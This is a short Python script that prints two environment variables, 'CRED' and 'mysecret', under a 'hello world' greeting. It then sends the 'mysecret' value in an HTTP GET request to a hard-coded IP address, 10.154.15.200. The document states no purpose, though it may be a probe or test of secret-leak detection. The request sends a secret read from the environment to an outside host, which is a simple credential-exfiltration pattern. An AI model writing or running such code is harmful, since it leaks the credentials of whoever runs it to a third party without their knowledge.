import os
import requests


print(f"hello world { os.environ.get('CRED')}, {os.environ.get('mysecret')}")


res = requests.get(f"http://10.154.15.200/?app={os.environ.get('mysecret')}")
print(res.content)